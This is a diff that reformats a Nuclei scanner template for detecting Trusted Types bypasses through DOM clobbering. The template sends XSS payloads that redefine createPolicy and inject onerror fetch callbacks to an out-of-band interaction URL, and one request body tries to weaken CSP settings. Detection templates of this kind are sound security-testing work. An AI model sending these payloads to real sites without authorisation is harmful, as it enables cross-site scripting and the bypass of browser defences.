@@ -1,188 +1,219 @@
-http:
-- headers:
-    Accept: text/html,application/xhtml+xml
-    Sec-Fetch-Site: same-origin
-  matchers:
-  - case-insensitive: true
-    condition: or
-    part: header
-    type: word
-    words:
-    - trusted-types
-    - require-trusted-types-for
-  - case-insensitive: true
-    condition: or
-    part: body
-    type: word
-    words:
-    - trustedTypes
-    - createPolicy
-    - TrustedHTML
-    - TrustedScript
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/'
-  - '{{BaseURL}}/app'
-  - '{{BaseURL}}/secure'
-  - '{{BaseURL}}/admin'
-- body: "{\n  \"html_content\": \"{{clobbering_payload}}<script>setTimeout(()=>{if(window.trustedTypes&&window.trustedTypes.createPolicy){var\
-    \ p=trustedTypes.createPolicy('bypass',{createHTML:x=>x,createScript:x=>x,createScriptURL:x=>x});document.body.innerHTML=p.createHTML('<img\
-    \ src=x onerror=fetch(\\\"{{callback_url}}/bypass-{{bypass_id}}\\\")>')}}, 100)</script>\"\
-    ,\n  \"trusted_types_enabled\": true,\n  \"bypass_csp\": true\n}\n"
-  headers:
-    Content-Type: application/json
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - part: interactsh_request
-    type: word
-    words:
-    - bypass-{{bypass_id}}
-  matchers-condition: and
-  method: POST
-  path:
-  - '{{BaseURL}}/api/content'
-  - '{{BaseURL}}/render'
-  - '{{BaseURL}}/html'
-  - '{{BaseURL}}/template'
-- body: "{\n  \"policy_name\": \"default\",\n  \"policy_config\": {\n    \"createHTML\"\
-    : \"return arguments[0]\",\n    \"createScript\": \"return arguments[0]\",\n \
-    \   \"createScriptURL\": \"return arguments[0]\"\n  },\n  \"clobbering_test\"\
-    : \"{{policy_bypass}}\",\n  \"validation_callback\": \"{{callback_url}}/policy-{{bypass_id}}\"\
-    \n}\n"
-  headers:
-    Content-Type: application/json
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - part: interactsh_request
-    type: word
-    words:
-    - policy-{{bypass_id}}
-  matchers-condition: and
-  method: PUT
-  path:
-  - '{{BaseURL}}/api/policy'
-  - '{{BaseURL}}/trusted/config'
-- body: "{\n  \"csp_directive\": \"trusted-types 'unsafe-inline' *\",\n  \"require_trusted_types\"\
-    : false,\n  \"dom_injection_test\": \"<form id='window'><input name='trustedTypes'></form><iframe\
-    \ name='trustedTypes' src='javascript:parent.window.trustedTypes={createPolicy:()=>({createHTML:x=>x+\\\
-    \"<img src=x onerror=fetch(\\\\\\\"{{callback_url}}/clobbered-{{bypass_id}}\\\\\
-    \\\")\\\"})}; void 0'></iframe>\",\n  \"bypass_verification\": true\n}\n"
-  headers:
-    Content-Type: application/json
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - part: interactsh_request
-    type: word
-    words:
-    - clobbered-{{bypass_id}}
-  matchers-condition: and
-  method: PATCH
-  path:
-  - '{{BaseURL}}/api/csp/update'
-  - '{{BaseURL}}/security/headers'
-- body: content={{clobbering_payload}}<script>try{if(trustedTypes.createPolicy){var
-    malicious=trustedTypes.createPolicy('evil',{createHTML:x=>x+'<img src=x onerror=fetch("{{callback_url}}/tt-bypass-{{bypass_id}}")'});document.body.innerHTML=malicious.createHTML('PWNED')}}catch(e){fetch('{{callback_url}}/error-{{bypass_id}}',
-    {method:'POST', body:JSON.stringify({error:e.message})})}</script>&bypass_trusted_types=true
-  headers:
-    Content-Type: application/x-www-form-urlencoded
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - condition: or
-    part: interactsh_request
-    type: word
-    words:
-    - tt-bypass-{{bypass_id}}
-    - error-{{bypass_id}}
-  matchers-condition: and
-  method: POST
-  path:
-  - '{{BaseURL}}/api/dom/test'
-  - '{{BaseURL}}/xss/filter'
-- body: "{\n  \"template\": \"<div>{{user_content}}</div>\",\n  \"user_content\":\
-    \ \"<object data='data:text/html,<form id=trustedTypes><input name=createPolicy></form><script>top.trustedTypes.createPolicy=(n,p)=>({createHTML:h=>h+`<img\
-    \ src=x onerror=fetch(\\\"{{callback_url}}/object-{{bypass_id}}\\\">`});void 0</script>'></object>\"\
-    ,\n  \"enable_trusted_types\": true,\n  \"sanitize_content\": false,\n  \"callback_url\"\
-    : \"{{callback_url}}/template-{{bypass_id}}\"\n}\n"
-  extractors:
-  - group: 1
-    part: body
-    regex:
-    - TrustedHTML\s*:\s*([^\n]+)
-    type: regex
-  - json:
-    - .policy_violations
-    - .trusted_types_bypassed
-    - .csp_report
-    type: json
-  headers:
-    Content-Type: application/json
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - part: interactsh_request
-    type: word
-    words:
-    - object-{{bypass_id}}
-  matchers-condition: and
-  method: POST
-  path:
-  - '{{BaseURL}}/api/template/render'
-  - '{{BaseURL}}/compile'
 id: trusted-types-dom-clobbering-bypass
+
 info:
+  name: Trusted Types DOM Clobbering Bypass Detection
   author: geeknik
+  severity: high
+  description: |
+    Detects Trusted Types policy bypass vulnerabilities through DOM clobbering attacks.
+    Tests for policy pollution, trusted type sink bypass, and CSP circumvention via
+    strategic DOM element placement. This attack vector is virtually unexplored as
+    Trusted Types are bleeding-edge browser security features.
+  reference:
+    - https://web.dev/trusted-types/
+    - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
+    - https://w3c.github.io/trusted-types/dist/spec/
+    - https://research.securitum.com/dom-clobbering-strikes-back/
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N
     cvss-score: 7.4
     cwe-id: CWE-79,CWE-1021,CWE-91
-  description: 'Detects Trusted Types policy bypass vulnerabilities through DOM clobbering
-    attacks.
-
-    Tests for policy pollution, trusted type sink bypass, and CSP circumvention via
-
-    strategic DOM element placement. This attack vector is virtually unexplored as
-
-    Trusted Types are bleeding-edge browser security features.
-
-    '
-  name: Trusted Types DOM Clobbering Bypass Detection
-  reference:
-  - https://web.dev/trusted-types/
-  - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
-  - https://w3c.github.io/trusted-types/dist/spec/
-  - https://research.securitum.com/dom-clobbering-strikes-back/
-  severity: high
   tags: trusted-types,dom-clobbering,csp-bypass,xss,policy-bypass
+
 variables:
-  bypass_id: '{{randstr}}'
-  callback_url: '{{interactsh-url}}'
-  clobbering_payload: <form id='trustedTypes'><input name='createPolicy' value='malicious'></form><img
-    name='trustedTypes' id='createPolicy'>
-  policy_bypass: <div id='trustedTypes'><span id='createPolicy'></span></div><iframe
-    name='trustedTypes' srcdoc='<script>parent.trustedTypes={}; parent.trustedTypes.createPolicy=()=>({createHTML:x=>x,
-    createScript:x=>x, createScriptURL:x=>x})</script>'></iframe>
+  callback_url: "{{interactsh-url}}"
+  bypass_id: "{{randstr}}"
+  clobbering_payload: "<form id='trustedTypes'><input name='createPolicy' value='malicious'></form><img name='trustedTypes' id='createPolicy'>"
+  policy_bypass: "<div id='trustedTypes'><span id='createPolicy'></span></div><iframe name='trustedTypes' srcdoc='<script>parent.trustedTypes={}; parent.trustedTypes.createPolicy=()=>({createHTML:x=>x, createScript:x=>x, createScriptURL:x=>x})</script>'></iframe>"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/app"
+      - "{{BaseURL}}/secure"
+      - "{{BaseURL}}/admin"
+
+    headers:
+      Accept: "text/html,application/xhtml+xml"
+      Sec-Fetch-Site: "same-origin"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "trusted-types"
+          - "require-trusted-types-for"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: body
+        words:
+          - "trustedTypes"
+          - "createPolicy"
+          - "TrustedHTML"
+          - "TrustedScript"
+        condition: or
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/content"
+      - "{{BaseURL}}/render"
+      - "{{BaseURL}}/html"
+      - "{{BaseURL}}/template"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "html_content": "{{clobbering_payload}}<script>setTimeout(()=>{if(window.trustedTypes&&window.trustedTypes.createPolicy){var p=trustedTypes.createPolicy('bypass',{createHTML:x=>x,createScript:x=>x,createScriptURL:x=>x});document.body.innerHTML=p.createHTML('<img src=x onerror=fetch(\"{{callback_url}}/bypass-{{bypass_id}}\")>')}}, 100)</script>",
+        "trusted_types_enabled": true,
+        "bypass_csp": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "bypass-{{bypass_id}}"
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/policy"
+      - "{{BaseURL}}/trusted/config"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "policy_name": "default",
+        "policy_config": {
+          "createHTML": "return arguments[0]",
+          "createScript": "return arguments[0]",
+          "createScriptURL": "return arguments[0]"
+        },
+        "clobbering_test": "{{policy_bypass}}",
+        "validation_callback": "{{callback_url}}/policy-{{bypass_id}}"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "policy-{{bypass_id}}"
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/csp/update"
+      - "{{BaseURL}}/security/headers"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "csp_directive": "trusted-types 'unsafe-inline' *",
+        "require_trusted_types": false,
+        "dom_injection_test": "<form id='window'><input name='trustedTypes'></form><iframe name='trustedTypes' src='javascript:parent.window.trustedTypes={createPolicy:()=>({createHTML:x=>x+\"<img src=x onerror=fetch(\\\"{{callback_url}}/clobbered-{{bypass_id}}\\\")\"})}; void 0'></iframe>",
+        "bypass_verification": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "clobbered-{{bypass_id}}"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/dom/test"
+      - "{{BaseURL}}/xss/filter"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: "content={{clobbering_payload}}<script>try{if(trustedTypes.createPolicy){var malicious=trustedTypes.createPolicy('evil',{createHTML:x=>x+'<img src=x onerror=fetch(\"{{callback_url}}/tt-bypass-{{bypass_id}}\")'});document.body.innerHTML=malicious.createHTML('PWNED')}}catch(e){fetch('{{callback_url}}/error-{{bypass_id}}', {method:'POST', body:JSON.stringify({error:e.message})})}</script>&bypass_trusted_types=true"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "tt-bypass-{{bypass_id}}"
+          - "error-{{bypass_id}}"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/template/render"
+      - "{{BaseURL}}/compile"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "template": "<div>{{user_content}}</div>",
+        "user_content": "<object data='data:text/html,<form id=trustedTypes><input name=createPolicy></form><script>top.trustedTypes.createPolicy=(n,p)=>({createHTML:h=>h+`<img src=x onerror=fetch(\"{{callback_url}}/object-{{bypass_id}}\">`});void 0</script>'></object>",
+        "enable_trusted_types": true,
+        "sanitize_content": false,
+        "callback_url": "{{callback_url}}/template-{{bypass_id}}"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "object-{{bypass_id}}"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "TrustedHTML\\s*:\\s*([^\\n]+)"
+        group: 1
+
+      - type: json
+        json:
+          - ".policy_violations"
+          - ".trusted_types_bypassed"
+          - ".csp_report"
